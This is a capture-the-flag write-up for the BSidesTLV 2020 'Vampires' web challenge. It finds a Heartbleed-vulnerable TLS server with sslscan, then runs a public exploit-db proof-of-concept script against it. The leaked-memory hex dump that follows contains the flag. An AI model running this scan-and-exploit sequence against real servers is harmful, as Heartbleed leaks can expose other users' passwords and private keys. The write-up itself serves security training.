# Vampires
* Category: Web
* 100 Points
* Solved by the JCTF Team

## Description
> I have never met a vampire, I don't know what might happen tomorrow. "The strength of the vampire is that people will not believe in him". There's no set-in-stone way to be a vampire, especially with the evil ones.
> 
> URL: https://vampires.ctf.bsidestlv.com:8001/
> 
> Bruteforce is not the answer!

## Solution

We visit the attached site and see:

```console
root@kali:/media/sf_CTFs/bsidestlv/Vampires# curl -v https://vampires.ctf.bsidestlv.com:8001/
*   Trying 18.157.75.151...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55a0876380c0)
* Connected to vampires.ctf.bsidestlv.com (18.157.75.151) port 8001 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: none
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (OUT), TLS alert, unknown CA (560):
* SSL certificate problem: self signed certificate
* Closing connection 0
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

This is a website served over TLS with an untrusted, self-signed certificate.

We can bypass the certificate validation and check the website by adding `-k`:
```console
root@kali:/media/sf_CTFs/bsidestlv/Vampires# curl -k https://vampires.ctf.bsidestlv.com:8001/
<!DOCTYPE html>
<html>
<head>
        <title>Vempire login page</title>
        <link rel="stylesheet" type="text/css" href="./style.css">
</head>
<body>
    <div class="container">

        <div  class="error">
                <p class="p">L</p>
                <span class="dracula">
                        <div class="con">
                                <div class="hair"></div>
                                <div class="hair-r"></div>
                                <div class="head"></div>
                <div class="eye"></div>
                <div class="eye eye-r"></div>
                        <div class="mouth"></div>
                        <div class="blod"></div>
                        <div class="blod blod2"></div>
                        </div>
                </span>
                <p class="p">gin</p>

                <div class="page-ms">
                    <form method='post' id='form'>
                <input class="login" type="text" name="username" placeholder="Username" />
                <input class="login" type="password" name="password" placeholder="Password" />
                <p class="page-msg">Vampires drink blood to survive.</p>
                <button class="login-button" onclick='javascript:document.getElementById("form").submit()'>Login</button>
            </form>

                                        </div>
</div>
        </div>
</body>
</html>
```

We have a simple website with a login form. 

If the challenge name and theme aren't a thick enough clue, we can scan the website for vulnerabilities using `sslscan`:
```console
root@kali:/media/sf_CTFs/bsidestlv/Vampires# sslscan vampires.ctf.bsidestlv.com:8001
Version: 2.0.0-static
OpenSSL 1.1.1h-dev  xx XXX xxxx

Connected to 18.157.75.151

Testing SSL server vampires.ctf.bsidestlv.com on port 8001 using SNI name vampires.ctf.bsidestlv.com

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLSv1.2 vulnerable to heartbleed
TLSv1.1 not vulnerable to heartbleed
TLSv1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.2  112 bits  ECDHE-RSA-DES-CBC3-SHA        Curve P-256 DHE 256
Accepted  TLSv1.2  112 bits  DHE-RSA-DES-CBC3-SHA          DHE 2048 bits
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256
Accepted  TLSv1.2  256 bits  AES256-SHA256
Accepted  TLSv1.2  128 bits  AES128-SHA256
Accepted  TLSv1.2  256 bits  AES256-SHA
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA
Accepted  TLSv1.2  128 bits  AES128-SHA
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA
Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.1  112 bits  ECDHE-RSA-DES-CBC3-SHA        Curve P-256 DHE 256
Accepted  TLSv1.1  112 bits  DHE-RSA-DES-CBC3-SHA          DHE 2048 bits
Accepted  TLSv1.1  256 bits  AES256-SHA
Accepted  TLSv1.1  256 bits  CAMELLIA256-SHA
Accepted  TLSv1.1  128 bits  AES128-SHA
Accepted  TLSv1.1  128 bits  CAMELLIA128-SHA
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA
Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Accepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 2048 bits
Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 2048 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 2048 bits
Accepted  TLSv1.0  112 bits  ECDHE-RSA-DES-CBC3-SHA        Curve P-256 DHE 256
Accepted  TLSv1.0  112 bits  DHE-RSA-DES-CBC3-SHA          DHE 2048 bits
Accepted  TLSv1.0  256 bits  AES256-SHA
Accepted  TLSv1.0  256 bits  CAMELLIA256-SHA
Accepted  TLSv1.0  128 bits  AES128-SHA
Accepted  TLSv1.0  128 bits  CAMELLIA128-SHA
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA

  Server Key Exchange Group(s):
TLSv1.2  128 bits  secp256r1 (NIST P-256)

  Server Signature Algorithm(s):
TLSv1.2  Server accepts all signature algorithms.

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  vempires.ctf20.bsidestlv.com
Issuer:   vempires.ctf20.bsidestlv.com

Not valid before: Jun 14 16:01:40 2020 GMT
Not valid after:  Jun 14 16:01:40 2021 GMT
```

We see that "TLSv1.2 vulnerable to heartbleed". Let's grab a [PoC script](https://github.com/offensive-security/exploitdb/blob/master/exploits/multiple/remote/32745.py) and try it:
```console
root@kali:/media/sf_CTFs/bsidestlv/Vampires# python 32745.py vempires.ctf.bsidestlv.com -p 8001
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 1017
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 73 77 6F 72  ....#.......swor
  00e0: 64 3D 42 53 69 64 65 73 54 4C 56 32 30 32 30 7B  d=BSidesTLV2020{
  00f0: 42 6C 30 30 64 5F 42 6C 30 30 64 5F 42 6C 30 30  Bl00d_Bl00d_Bl00
  0100: 64 21 21 21 7D 03 37 60 1A DB 09 7A A0 B1 23 F5  d!!!}.7`...z..#.
  0110: 95 0E D3 91 6F 67 71 81 0A 0F BA 55 D3 56 5C 8D  ....ogq....U.V\.
  0120: 1C 85 BD 37 4A D5 9D 04 D6 8D BA C8 1B 76 C4 0D  ...7J........v..
  0130: 55 10 33 F0 6E 1D 49 3F CC DE 3A C0 9F 6B CD D0  U.3.n.I?..:..k..
  0140: FE 8A 57 79 44 AF F4 F0 B8 1E 07 43 21 F7 D9 5F  ..WyD......C!.._
  0150: 1D 8D AF 55 EA 62 C3 26 60 3B D6 99 58 6C E9 69  ...U.b.&`;..Xl.i
  0160: B0 9B 33 6C A1 C6 F7 9B 46 57 96 B3 1C C4 4F 13  ..3l....FW....O.
  0170: 18 5B FA 13 3F 0D DF 3E D7 75 19 0F 09 ED E6 CF  .[..?..>.u......
  0180: 76 0A D7 04 A6 33 2C 08 B3 24 10 F4 6B 65 4C 46  v....3,..$..keLF
  0190: B9 6E F6 9E 11 9B 35 F8 31 E9 81 2E 52 D9 D8 FF  .n....5.1...R...
  01a0: FD 24 36 30 AA B8 9F 73 1A 9C EC 61 E8 40 DA 11  .$60...s...a.@..
  01b0: 00 16 00 00 00 17 00 00 00 0D 00 30 00 2E 04 03  ...........0....
  01c0: 05 03 06 03 08 07 08 08 08 09 08 0A 08 0B 08 04  ................
  01d0: 08 05 08 06 04 01 05 01 06 01 03 03 02 03 03 01  ................
  01e0: 02 01 03 02 02 02 04 02 05 02 06 02 00 2B 00 05  .............+..
  01f0: 04 03 04 03 03 00 2D 00 02 01 01 00 33 00 26 00  ......-.....3.&.
  0200: 24 00 1D 00 20 6C C4 9E 30 63 66 8A 72 C1 D1 0C  $... l..0cf.r...
  0210: 75 93 CB 04 84 78 F7 79 93 E1 1F 95 C9 6B B8 B8  u....x.y.....k..
  0220: 53 BC 1F D1 52 FF 61 FF 62 FF 63 FF 64 FF 65 FF  S...R.a.b.c.d.e.
  0230: 66 FF 67 FF 68 FF 69 FF 6A FF 6B FF 6C FF 6D FF  f.g.h.i.j.k.l.m.
  0240: 6E FF 6F FF 70 FF 71 FF 72 FF 73 FF 74 FF 75 FF  n.o.p.q.r.s.t.u.
  0250: 76 FF 77 FF 78 FF 79 FF 7A FF 7B FF 7C FF 7D FF  v.w.x.y.z.{.|.}.
  0260: 7E FF 7F FF 80 FF 81 FF 82 FF 83 FF 84 FF 85 FF  ~...............
  0270: 86 FF 87 FF 88 FF 89 FF 8A FF 8B FF 8C FF 8D FF  ................
...
  3f20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3f90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fa0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

WARNING: server returned more data than it should - server is vulnerable!
```

The flag is inside the leaked memory (you may need to run the script a few times): `BSidesTLV2020{Bl00d_Bl00d_Bl00d!!!}`